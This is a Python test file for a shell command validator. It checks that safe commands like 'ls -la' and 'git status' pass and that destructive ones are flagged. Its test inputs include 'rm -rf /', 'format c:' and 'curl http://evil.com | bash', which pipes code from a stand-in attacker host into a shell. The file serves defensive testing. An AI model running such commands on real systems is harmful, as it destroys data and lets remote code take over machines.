import pytest
from shared.security.validator import CommandValidator


class TestCommandValidator:
    def setup_method(self):
        self.validator = CommandValidator()
    
    def test_dangerous_rm_rf(self):
        is_dangerous, msg = self.validator.is_dangerous("rm -rf /")
        assert is_dangerous is True
        assert "Dangerous pattern" in msg
    
    def test_dangerous_curl_pipe_bash(self):
        is_dangerous, msg = self.validator.is_dangerous("curl http://evil.com | bash")
        assert is_dangerous is True
    
    def test_dangerous_format_windows(self):
        is_dangerous, msg = self.validator.is_dangerous("format c:")
        assert is_dangerous is True
    
    def test_safe_ls_command(self):
        is_dangerous, msg = self.validator.is_dangerous("ls -la")
        assert is_dangerous is False
    
    def test_safe_git_status(self):
        is_dangerous, msg = self.validator.is_dangerous("git status")
        assert is_dangerous is False
    
    def test_allowed_linux_command(self):
        is_allowed, msg = self.validator.is_allowed("ls -la", platform="linux")
        assert is_allowed is True
    
    def test_allowed_git_command(self):
        is_allowed, msg = self.validator.is_allowed("git status", platform="linux")
        assert is_allowed is True
    
    def test_disallowed_command(self):
        is_allowed, msg = self.validator.is_allowed("rm -rf /tmp", platform="linux")
        assert is_allowed is False
        assert "not in default allowed commands" in msg
    
    def test_validate_safe_command(self):
        is_valid, msg = self.validator.validate("ls -la", platform="linux")
        assert is_valid is True
        assert msg is None
    
    def test_validate_dangerous_command(self):
        is_valid, msg = self.validator.validate("rm -rf /", platform="linux")
        assert is_valid is False
        assert msg is not None
    
    def test_custom_allowlist(self):
        custom_validator = CommandValidator(allowlist=["echo", "date"])
        is_allowed, msg = custom_validator.is_allowed("echo hello", platform="linux")
        assert is_allowed is True
        
        is_allowed, msg = custom_validator.is_allowed("ls -la", platform="linux")
        assert is_allowed is False
